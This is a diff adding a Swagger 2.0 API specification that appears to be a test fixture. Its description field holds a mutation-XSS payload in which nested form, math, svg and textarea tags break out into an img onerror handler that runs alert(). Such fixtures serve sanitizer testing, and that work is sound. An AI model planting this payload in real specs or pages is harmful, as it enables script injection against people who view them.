@@ -1,0 +1,25 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('==XSS==') src=1>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/jso
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: This is just a test
